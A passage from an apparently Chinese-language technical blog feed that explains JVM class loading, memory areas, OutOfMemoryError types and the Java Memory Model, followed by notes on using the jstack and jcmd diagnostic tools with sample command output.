<p>初始化阶段是执行构造函数<code>&lt;cinit&gt;</code>方法的过程</p>
</li>
<li>
<p><code>&lt;cinit&gt;</code>方法是由编译器自动收集类中的所有变量的赋值动作和静态语句块中的语句合并产生的</p>
</li>
<li>
<p>静态语句块中只能访问到定义在静态语句块之前的变量，定义在他之后的变量，只能赋值，不能访问。</p>
</li>
<li>
<p><code>&lt;cinit&gt;</code>方法与类的构造函数的区别：他不需要显式的调用父类的构造函数，虚拟机会保证在子类的<code>&lt;cinit&gt;</code>执行之前，先执行父类的<code>&lt;cinit&gt;</code>，因此，在虚拟机中首先被执行的是Object的<code>&lt;cinit&gt;</code>方法</p>
</li>
<li>
<p>由于父类的<code>&lt;cinit&gt;</code>方法先被执行，也就意味着父类中定义的静态语句块，要优于子类</p>
</li>
<li>
<p><code>&lt;cinit&gt;</code>方法对于一个类来说并不是必须的</p>
</li>
<li>
<p>接口中照样存在<code>&lt;cinit&gt;</code>方法</p>
</li>
<li>
<p>虚拟机有义务保证<code>&lt;cinit&gt;</code>方法的线程安全</p>
</li>
</ul>
<h3 id="JVM类加载器">JVM类加载器</h3>
<h4 id="父委托机制">父委托机制</h4>
<ol>
<li>类加载器的委托是优先交给父亲加载器先去尝试加载</li>
<li>父加载器和子加载器其实是一种包装关系，或者包含关系</li>
</ol>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220211172948276.png" alt="image-20220211172948276"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BootClassLoader</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>
        <span class="token comment">// 根（Bootstrap）类加载器加载的内容</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"sun.boot.class.path"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 扩展（Extension）类加载器加载的内容</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"java.ext.dirs"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> klass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"example.chapter2.SimpleObject"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 系统(Application)类加载器</span>
        <span class="token comment">// sun.misc.Launcher$AppClassLoader@18b4aac2</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>klass<span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 扩展类加载器</span>
        <span class="token comment">// sun.misc.Launcher$ExtClassLoader@6d6f6e28</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>klass<span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 根加载器是由C++写的，输出为null。</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>klass<span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 无法获取到自定义的String类</span>
        <span class="token comment">// 原因：父加载器中存在，优先返回父加载器</span>
        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="类加载器的命名空间">类加载器的命名空间</h4>
<ul>
<li>
<p>每个类的加载器都有子命名空间。命名空间由该加载器和其所有父加载器的类组成</p>
</li>
<li>
<p>在同一个命名空间中，不会出现完整的名字</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220212115459354.png" alt="image-20220212115459354"></p>
</li>
</ul>
<h4 id="运行时包">运行时包</h4>
<ul>
<li>
<p>父类加载器看不到子类加载器加载的类</p>
</li>
<li>
<p>不同命名空间下的类加载器之间的类互相不可访问</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">可以理解为：运行时，类的实际包名 <span class="token operator">=</span> 类加载器名称 <span class="token operator">+</span> 包名

<span class="token comment">//Boot.Ext.App.com.wangwenjun.concurrent.classloader.chapter5.SimpleClassLoaderTest</span>
<span class="token comment">//Boot.Ext.App.SimpleClassLoader.com.wangwenjun.concurrent.classloader.chapter5.SimpleClassLoaderTest</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h3 id="类的卸载以及ClassLoader的卸载（GC）">类的卸载以及ClassLoader的卸载（GC）</h3>
<p>JVM中的Class只有满足以下三个条件，才能被GC回收，也就是该Class被卸载（unload）</p>
<ul>
<li>该类所有的实例都已经被GC</li>
<li>加载该类的ClassLoader实例被GC</li>
<li>该类的java.lang.Class对象没有在任何地方被引用</li>
</ul>
<p>GC的时机我们是不可控的，那么同样的我们对于Class的卸载也是不可控的</p>
<h3 id="线程上下文类加载器">线程上下文类加载器</h3>
<p>举例</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.mysql.jdbc.Driver"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="JVM内存结构">JVM内存结构</h2>
<img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/v2-abefb713de46f1e6dd241246c0afe263_720w.jpg" alt="img">    
<p>JVM的内存结构大概分为：</p>
<ul>
<li>堆（Heap）：线程共享。所有的==对象实例==以及==数组==都要在堆上分配。<strong>回收器主要管理的对象</strong>。</li>
<li>方法区（Method Area）：线程共享。存储类信息、常量、静态变量、即时编译器编译后的代码。（非堆）</li>
<li>虚拟机栈（JVM Stack）：线程私有。存储局部变量表、操作栈、动态链接、方法出口，对象指针。</li>
<li>本地方法栈（Native Method Stack）：线程私有。为虚拟机使用到的Native 方法服务。如Java使用c或者c++编写的接口服务时，代码在此区运行。</li>
<li>程序计数器（Program Counter Register）：线程私有。有些文章也翻译成PC寄存器（PC Register）。可看作是当前线程所执行的字节码的行号指示器。指向下一条要执行的指令。</li>
</ul>
<p>先看一张图，这张图能很清晰的说明JVM内存结构的布局和相应的控制参数：</p>
<img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/v2-8845236d1ab9f22fcc658375967d53fb_720w.jpg" alt="img" style="zoom:150%;"> 
<h3 id="堆">堆</h3>
<p>堆的作用是存放对象实例和数组。从结构上来分，可以分为新生代和老年代。而新生代又可以分为Eden 空间、From Survivor 空间（s0）、To Survivor 空间（s1）。</p>
<p>所有新生成的对象首先都是放在新生代的。</p>
<p>需要注意，Survivor的两个区是对称的，没先后关系，所以同一个区中可能同时存在从Eden复制过来的对象，和从前一个Survivor复制过来的对象，而复制到老年代的只有从第一个Survivor区过来的对象。而且，Survivor区总有一个是空的。</p>
<ul>
<li>控制参数</li>
</ul>
<p>-Xms设置堆的最小空间大小。-Xmx设置堆的最大空间大小。</p>
<p>-XX:NewSize设置新生代最小空间大小。-XX:MaxNewSize设置新生代最大空间大小。</p>
<ul>
<li>垃圾回收</li>
</ul>
<p>此区域是垃圾回收的主要操作区域。</p>
<ul>
<li>异常情况</li>
</ul>
<p>如果在堆中没有内存完成实例分配，并且堆也无法再扩展时，将会抛出OutOfMemoryError 异常</p>
<h3 id="方法区">方法区</h3>
<p>方法区（Method Area）与Java 堆一样，<strong>是各个线程共享的内存区域</strong>，它用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。</p>
<p>虽然Java 虚拟机规范把方法区描述为堆的一个逻辑部分，但是它却有一个别名叫做<code>Non-Heap（非堆）</code>，目的应该是与Java 堆区分开来。</p>
<p>很多人愿意把方法区称为“永久代”（Permanent Generation），本质上两者并不等价，仅仅是因为HotSpot虚拟机的设计团队选择把GC 分代收集扩展至方法区，或者说使用永久代来实现方法区而已。对于其他虚拟机（如BEA JRockit、IBM J9 等）来说是不存在永久代的概念的。在Java8中永生代彻底消失了。</p>
<ul>
<li>控制参数</li>
</ul>
<p>-XX:PermSize 设置最小空间 -XX:MaxPermSize 设置最大空间。</p>
<ul>
<li>垃圾回收</li>
</ul>
<p>对此区域会涉及但是很少进行垃圾回收。这个区域的内存回收目标主要是针对常量池的回收和对类型的卸载，一般来说这个区域的回收“成绩”比较难以令人满意。</p>
<ul>
<li>异常情况</li>
</ul>
<p>根据Java 虚拟机规范的规定， 当方法区无法满足内存分配需求时，将抛出OutOfMemoryError。</p>
<h3 id="方法栈（虚拟机栈）">方法栈（虚拟机栈）</h3>
<p>每个线程会有一个私有的栈。每个线程中方法的调用又会在本栈中创建一个<strong>栈帧</strong>。在方法栈中会存放编译期可知的各种基本数据类型（boolean、byte、char、short、int、float、long、double）、对象引用（reference 类型，它不等同于对象本身。<strong>局部变量表所需的内存空间在编译期间完成分配</strong>，当进入一个方法时，这个方法需要在帧中分配多大的局部变量空间是完全确定的，在方法运行期间不会改变局部变量表的大小。</p>
<ul>
<li>控制参数</li>
</ul>
<p>-Xss控制每个线程栈的大小。</p>
<ul>
<li>异常情况</li>
</ul>
<p>在Java 虚拟机规范中，对这个区域规定了两种异常状况：</p>
<p>- StackOverflowError： 异常线程请求的栈深度大于虚拟机所允许的深度时抛出；</p>
<p>- OutOfMemoryError 异常： 虚拟机栈可以动态扩展，当扩展时无法申请到足够的内存时会抛出。</p>
<h3 id="本地方法栈">本地方法栈</h3>
<p>本地方法栈（Native Method Stacks）与虚拟机栈所发挥的作用是非常相似的，其区别不过是虚拟机栈为虚拟机执行Java 方法（也就是字节码）服务，而本地方法栈则</p>
<p>是为虚拟机使用到的Native 方法服务。</p>
<ul>
<li>控制参数</li>
</ul>
<p>在Sun JDK中本地方法栈和方法栈是同一个，因此也可以用-Xss控制每个线程的大小。</p>
<ul>
<li>异常情况</li>
</ul>
<p>与虚拟机栈一样，本地方法栈区域也会抛出StackOverflowError 和OutOfMemoryError异常。</p>
<h3 id="程序计数器">程序计数器</h3>
<p>它的作用可以看做是当前线程所执行的字节码的行号指示器。</p>
<ul>
<li>
<p>异常情况：</p>
<p>此内存区域是唯一一个在Java 虚拟机规范中没有规定任何OutOfMemoryError 情况的区域。</p>
</li>
</ul>
<hr>
<h2 id="常见内存溢出错误说明">常见内存溢出错误说明</h2>
<p>有了对内存结构清晰的认识，就可以帮助我们理解不同的OutOfMemoryErrors，下面列举一些比较常见的内存溢出错误，通过查看冒号“：”后面的提示信息，基本上就能断定是JVM运行时数据的哪个区域出现了问题。</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Exception in thread “main”: java.lang.OutOfMemoryError: Java heap space

原因：对象不能被分配到堆内存中。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Exception in thread “main”: java.lang.OutOfMemoryError: PermGen space

原因：类或者方法不能被加载到老年代。它可能出现在一个程序加载很多类的时候，比如引用了很多第三方的库。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Exception in thread “main”: java.lang.OutOfMemoryError: Requested array size exceeds VM limit

原因：创建的数组大于堆内存的空间。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Exception in thread “main”: java.lang.OutOfMemoryError: request &lt;size&gt; bytes for &lt;reason&gt;. Out of swap space?

原因：方法内存分配失败。JNI、本地库或者Java虚拟机都会从本地堆中分配内存空间。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Exception in thread “main”: java.lang.OutOfMemoryError: &lt;reason&gt; &lt;stack trace&gt;（Native method）

原因：同样是本地方法内存分配失败，只不过是JNI或者本地方法或者Java虚拟机发现。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>关于OutOfMemoryError的更多信息可以查看：</p>
<p><a href="https://link.zhihu.com/?target=https%3A//docs.oracle.com/javase/7/docs/webnotes/tsg/TSG-VM/html/memleaks.html">Troubleshooting Memory Leaksdocs.oracle.com/javase/7/docs/webnotes/tsg/TSG-VM/html/memleaks.html</a></p>
<h2 id="Java内存模型"><strong>Java内存模型</strong></h2>
<p>​		由上述对JVM内存结构的描述中，我们知道了堆和方法区是线程共享的。而局部变量，方法定义参数和异常处理器参数就不会在线程之间共享，它们不会有内存可见性问题，也不受内存模型的影响。</p>
<p><strong>Java线程之间的通信由Java内存模型（本文简称为JMM）控制</strong></p>
<p>​		JMM决定一个线程对共享变量的写入何时对另一个线程可见。</p>
<p>​		从抽象的角度来看，JMM定义了线程和主内存之间的抽象关系：线程之间的共享变量存储在主内存（main memory）中，每个线程都有一个私有的本地内存（local memory），<code>本地内存中存储了该线程以读/写共享变量的副本</code>。</p>
<p>​		本地内存是JMM的一个抽象概念，并不真实存在。它涵盖了缓存，写缓冲区，寄存器以及其他的硬件和编译器优化。</p>
<p>​		Java内存模型的抽象示意图如下：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/v2-b098a84eb7598d70913444a991d1759b_720w.jpg" alt="img"></p>
<p>从上图来看，线程A与线程B之间如要通信的话，必须要经历下面2个步骤：</p>
<ol>
<li>首先，线程A把本地内存A中更新过的共享变量刷新到主内存中去。</li>
<li>通知本地内存共享变量的副本失效，再次读取时需要强制从主内存读取。</li>
<li>然后，线程B到主内存中去读取线程A之前已更新过的共享变量。</li>
</ol>
<p>下面通过示意图来说明这两个步骤：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/v2-2c452d147bf0d09b14b770d3990740cb_720w.jpg" alt="img"></p>
<p>如上图所示，本地内存A和B有主内存中共享变量x的副本。假设初始时，这三个内存中的x值都为0。线程A在执行时，把更新后的x值（假设值为1）临时存放在自己的本地内存A中。当线程A和线程B需要通信时，线程A首先会把自己本地内存中修改后的x值刷新到主内存中，此时主内存中的x值变为了1。随后，线程B到主内存中去读取线程A更新后的x值，此时线程B的本地内存的x值也变为了1。</p>
<p>从整体来看，这两个步骤实质上是线程A在向线程B发送消息，而且<strong>这个通信过程必须要经过主内存</strong>。JMM通过控制主内存与每个线程的本地内存之间的交互，来为java程序员提供内存可见性保证。</p>
<h2 id="指令重排序">指令重排序</h2>
<p>在执行程序时为了提高性能，编译器和处理器常常会对指令做重排序。</p>
<p>这里说的重排序可以发生在好几个地方：编译器、运行时、JIT等，比如编译器会觉得把一个变量的写操作放在最后会更有效率，编译后，这个指令就在最后了（前提是只要不改变程序的语义，编译器、执行器就可以这样自由的随意优化），一旦编译器对某个变量的写操作进行优化（放到最后），那么在执行之前，另一个线程将不会看到这个执行结果。</p>
<p>当然了，写入动作可能被移到后面，那也有可能被挪到了前面，这样的“优化”有什么影响呢？这种情况下，其它线程可能会在程序实现“发生”之前，看到这个写入动作（这里怎么理解，指令已经执行了，但是在代码层面还没执行到）。通过<code>内存屏障</code>的功能，我们可以禁止一些不必要、或者会带来负面影响的重排序优化，在内存模型的范围内，实现更高的性能，同时保证程序的正确性。</p>
<p>下面我们来看一个重排序的例子：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> <span class="token class-name">Reordering</span> <span class="token punctuation">{</span>
  <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">writer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    y <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">reader</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> r1 <span class="token operator">=</span> y<span class="token punctuation">;</span>
    <span class="token keyword">int</span> r2 <span class="token operator">=</span> x<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>假设这段代码有2个线程并发执行，线程A执行writer方法，线程B执行reader方法，线程B看到y的值为2，因为把y设置成2发生在变量x的写入之后（代码层面），所以能断定线程B这时看到的x就是1吗？</p>
<p>当然不行！ 因为在writer方法中，可能发生了重排序，y的写入动作可能发在x写入之前，这种情况下，线程B就有可能看到x的值还是0。</p>
<p>在Java内存模型中，描述了在多线程代码中，哪些行为是正确的、合法的，以及多线程之间如何进行通信，代码中变量的读写行为如何反应到内存、CPU缓存的底层细节。</p>
<p>在Java中包含了几个关键字：volatile、final和synchronized，帮助程序员把代码中的并发需求描述给编译器。JMM中定义了它们的行为，确保正确同步的Java代码在所有的处理器架构上都能正确执行。</p>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM性能调优工具</title>
    <url>/20221027/cc1c3bcb.html</url>
    <content><![CDATA[<h1>jstack：Java堆栈跟踪工具</h1>
<p>jstack（Stack Trace for Java）命令用于<strong>生成虚拟机当前时刻的线程快照</strong>（一般称为threaddump或者javacore文件）。</p>
<p>线程快照就是当前虚拟机内每一条线程正在执行的方法堆栈的集合，生成线程快照的主要目的是定位线程出现长时间停顿的原因，如线程间死锁、死循环、请求外部资源导致的长时间等待等，都是导致线程长时间停顿的常见原因。线程出现停顿的时候通过jstack来查看各个线程的调用堆栈，就可以知道没有响应的线程到底在后台做些什么事情，或者等待着什么资源。</p>
<p>命令格式<br>
<strong>jstack</strong> [option]  LVMID</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-l</td>
<td>long listings，会打印出额外的锁信息，在发生死锁时可以用jstack -l pid来观察锁持有情况</td>
</tr>
<tr>
<td>-m</td>
<td>mixed mode，不仅会输出Java堆栈信息，如果调用到本地方法的话，可以显示C/C++的堆栈</td>
</tr>
<tr>
<td>-F</td>
<td>当正常输出请求不被响应时，强制输出线程堆栈</td>
</tr>
</tbody>
</table>
<p>在JDK 1.5中，java.lang.Thread类新增了一个getAllStackTraces（）方法用于获取虚拟机中所有线程的StackTraceElement对象。</p>
<p>使用这个方法可以通过简单的几行代码就完成jstack的大部分功能，在实际项目中不妨调用这个方法做个管理员页面，可以随时使用浏览器来查看线程堆栈。</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">＜%@page import="java.util.Map"%＞
＜html＞
＜head＞
＜title＞服务器线程信息＜/title＞
＜/head＞
＜body＞
＜pre＞
＜%
for（Map.Entry＜Thread,StackTraceElement[]＞stackTrace：Thread.getAllStackTraces（）.entrySet（））{
　　Thread thread=（Thread）stackTrace.getKey（）；
　　StackTraceElement[]stack=（StackTraceElement[]）stackTrace.getValue（）；
　　if（thread.equals（Thread.currentThread（）））{
　　　　continue；
　　}
　　out.print（"\n线程："+ thread.getName（）+"\n"）；
　　for（StackTraceElement element：stack）{
　　　　out.print（"\t"+element+"\n"）；
　　}
}
%＞
＜/pre＞
＜/body＞
＜/html＞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>
<p>jps 查看进程ID</p>
  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">&gt;</span>jps
<span class="token number">10904</span> Jps
<span class="token number">3512</span>
<span class="token number">11228</span> Launcher
<span class="token number">12220</span> Bank<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>jstack 打印堆栈信息</p>
  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">&gt;</span>jstack <span class="token parameter variable">-l</span> <span class="token number">12220</span>
<span class="token number">2021</span>-12-26 <span class="token number">22</span>:09:55
Full thread dump Java HotSpot<span class="token punctuation">(</span>TM<span class="token punctuation">)</span> <span class="token number">64</span>-Bit Server VM <span class="token punctuation">(</span><span class="token number">25.131</span>-b11 mixed mode<span class="token punctuation">)</span>:

<span class="token string">"DestroyJavaVM"</span> <span class="token comment">#16 prio=5 os_prio=0 tid=0x00000000029e2800 nid=0xf8 waiting on condition [0x0000000000000000]</span>
   java.lang.Thread.State: RUNNABLE

   Locked ownable synchronizers:
        - None

<span class="token string">"四号"</span> <span class="token comment">#15 prio=5 os_prio=0 tid=0x000000001e5c8000 nid=0x3524 waiting for monitor entry [0x000000001f63f000]</span>
   java.lang.Thread.State: BLOCKED <span class="token punctuation">(</span>on object monitor<span class="token punctuation">)</span>
        at com.hots.chapter7.TickWindowRunnable.run<span class="token punctuation">(</span>Bank.java:27<span class="token punctuation">)</span>
        - waiting to lock <span class="token operator">&lt;</span>0x000000076b62bf2<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span> <span class="token punctuation">(</span>a java.lang.Object<span class="token punctuation">)</span>
        at java.lang.Thread.run<span class="token punctuation">(</span>Thread.java:748<span class="token punctuation">)</span>

   Locked ownable synchronizers:
        - None

<span class="token string">"三号"</span> <span class="token comment">#14 prio=5 os_prio=0 tid=0x000000001e5c7800 nid=0x18b4 waiting for monitor entry [0x000000001f53f000]</span>
   java.lang.Thread.State: BLOCKED <span class="token punctuation">(</span>on object monitor<span class="token punctuation">)</span>
        at com.hots.chapter7.TickWindowRunnable.run<span class="token punctuation">(</span>Bank.java:27<span class="token punctuation">)</span>
        - waiting to lock <span class="token operator">&lt;</span>0x000000076b62bf2<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span> <span class="token punctuation">(</span>a java.lang.Object<span class="token punctuation">)</span>
        at java.lang.Thread.run<span class="token punctuation">(</span>Thread.java:748<span class="token punctuation">)</span>
<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>jstack 打印堆栈信息到文件</p>
  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">&gt;</span>jstack <span class="token parameter variable">-l</span> <span class="token number">12220</span> <span class="token operator">&gt;&gt;</span> test.txt

<span class="token comment"># 打印结果保存到目录：C:\Users\Administrator下</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h1>jcmd：虚拟机工具</h1>
<h2 id="jcmd-l：列出当前运行的所有虚拟机">jcmd -l：列出当前运行的所有虚拟机</h2>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-l</td>
<td>参数-l表示列出所有java虚拟机</td>
</tr>
</tbody>
</table>
<h2 id="jcmd-pid-help：列出该虚拟机支持的所有命令">jcmd [pid] help：列出该虚拟机支持的所有命令</h2>
<p>针对每一个虚拟机，可以使用help命令列出该虚拟机支持的所有命令</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">&gt;</span> jcmd <span class="token number">13204</span> <span class="token builtin class-name">help</span>
<span class="token number">13204</span>:
The following commands are available:
JFR.stop
JFR.start
JFR.dump
JFR.check
VM.native_memory
VM.check_commercial_features
VM.unlock_commercial_features
ManagementAgent.stop
ManagementAgent.start_local
ManagementAgent.start
GC.rotate_log
Thread.print
GC.class_stats
GC.class_histogram
GC.heap_dump
GC.run_finalization
GC.run
VM.uptime
VM.flags
VM.system_properties
VM.command_line
VM.version
<span class="token builtin class-name">help</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其中具体举例</p>
<h2 id="jcmd-pid-VM-uptime：-查看虚拟机启动时间">jcmd  [pid]  VM.uptime： 查看虚拟机启动时间</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">&gt;</span> jcmd <span class="token number">13204</span> VM.uptime
<span class="token number">13204</span>:
<span class="token number">142.109</span> s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="jcmd-pid-Thread-print：打印线程栈信息">jcmd [pid] Thread.print：打印线程栈信息</h2>
<p>（该命令同 <a href="https://www.jianshu.com/p/025cb069cb69">jstack</a> 命令）</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211202105919556-1667231157378-120.png" alt="image-20211202105919556"></p>
<h2 id="jcmd-pid-GC-class-histogram：查看系统中类统计信息">jcmd [pid]  GC.class_histogram：查看系统中类统计信息</h2>
<p>这里和jmap -histo pid的效果是一样的 。这个可以查看每个类的实例数量和占用空间大小。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211202110015127-1667231157378-121.png" alt="image-20211202110015127"></p>
<h2 id="jcmd-pid-GC-heap-dump-filepath-name">jcmd [pid] GC.heap_dump [filepath&amp;name]</h2>
<p>跟 jmap命令：jmap -dump:format=b,file=heapdump.phrof pid 效果一样。</p>
<p>导出的 dump 文件，可以使用MAT 或者 Visual VM 等工具进行分析。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">&gt;</span> jcmd <span class="token number">13204</span> GC.heap_dump D:<span class="token punctuation">\</span>test.hprof
<span class="token number">13204</span>:
Heap dump <span class="token function">file</span> created<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
